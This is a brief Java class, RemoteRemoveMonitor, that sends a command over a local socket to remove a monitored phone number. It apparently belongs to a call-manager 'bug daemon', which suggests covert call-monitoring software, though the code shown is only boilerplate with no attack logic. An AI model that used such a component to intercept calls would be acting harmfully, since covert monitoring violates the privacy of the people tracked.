package com.vvt.callmanager.ref.command;

import com.fx.socket.SocketCmd;
import com.vvt.callmanager.ref.BugDaemonResource;
import com.vvt.callmanager.ref.MonitorNumber;

public class RemoteRemoveMonitor extends SocketCmd<MonitorNumber, Boolean> {
	
	private static final long serialVersionUID = -4672408481848947239L;
	
	private static final String TAG = "RemoteRemoveMonitor";
	private static final String SERVER_NAME = BugDaemonResource.CallMgr.SOCKET_NAME;

	public RemoteRemoveMonitor(MonitorNumber data) {
		super(data, Boolean.class);
	}

	@Override
	protected String getTag() {
		return TAG;
	}

	@Override
	protected String getServerName() {
		return SERVER_NAME;
	}

}
